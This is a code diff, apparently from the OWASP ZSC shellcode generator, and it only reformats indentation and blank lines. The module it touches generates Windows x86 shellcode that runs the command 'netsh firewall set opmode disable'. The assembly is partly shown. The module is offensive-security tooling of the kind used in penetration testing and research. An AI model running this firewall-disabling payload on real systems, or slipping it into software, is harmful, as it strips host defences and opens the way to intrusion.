@@ -8,8 +8,10 @@ https://groups.google.com/d/forum/owasp-zsc [ owasp-zsc[at]googlegroups[dot]com 
 '''
 from core import stack
 from math import ceil
+
+
 def disable_firewall(command):
-        return '''
+    return '''
 xor    %ecx,%ecx
 mov    %fs:0x30(%ecx),%eax
 mov    0xc(%eax),%eax
@@ -83,6 +85,7 @@ push   %ecx
 call   *%eax
 '''.format(command)
 
+
 def run(data):
-   command = "netsh firewall set opmode disable"
-   return disable_firewall(stack.generate(command,"%ecx","string"))
+    command = "netsh firewall set opmode disable"
+    return disable_firewall(stack.generate(command, "%ecx", "string"))
